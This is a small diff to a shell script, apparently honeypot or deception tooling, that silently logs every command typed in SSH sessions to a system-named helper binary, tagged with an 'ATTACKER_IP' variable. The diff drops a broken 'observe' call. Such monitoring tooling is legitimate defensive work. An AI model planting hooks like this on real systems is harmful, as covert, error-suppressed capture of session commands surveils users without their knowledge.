@@ -12,7 +12,9 @@ if [ -n "$SSH_CLIENT" ] || [ -n "$SSH_CONNECTION" ]; then
         if [[ -n "$cmd" && ! "$cmd" =~ ^[[:space:]]*$ ]]; then
             # Skip common benign commands
             if [[ ! "$cmd" =~ ^(ls|cd|pwd|echo|cat|clear|exit|history)$ ]]; then
-                /usr/local/bin/syslogd-helper observe "Command executed: $cmd" 2>/dev/null || true
+                # `observe` is not a real subcommand (see
+                # scripts/crdt/src/main.rs) -- it used to fail silently here.
+                # `action` is the real, working call and already records this.
                 /usr/local/bin/syslogd-helper action "$ATTACKER_IP" "$HOSTNAME_SHORT" "$cmd" 2>/dev/null || true
             fi
         fi
